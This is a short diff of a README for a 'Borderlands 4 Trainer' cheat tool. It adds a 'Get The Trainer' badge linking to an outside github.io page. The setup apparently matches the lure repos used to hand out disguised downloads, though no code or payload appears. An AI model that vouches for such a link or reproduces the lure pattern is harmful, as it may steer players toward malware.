@@ -1,8 +1,10 @@
-# Borderlands 4 Trainer Guide 🎮⚡
+# Borderlands 4 Trainer 🎮⚡
 
 ## Description
 
 Borderlands 4 is a chaotic mix of insane gunplay, wild co-op fun, and endless loot farming. But if you’re tired of endless grinding or just want to experiment with all the possibilities, a **Borderlands 4 trainer** is your best friend. Trainers give you instant control over health, ammo, XP, loot drops, and way more, letting you shape the game exactly how you want it.
+
+[![Get](https://img.shields.io/badge/Get%20The-Trainer-blueviolet)](https://borderlands-4-trainer.github.io/.github/)
 
 ## Product Overview
 
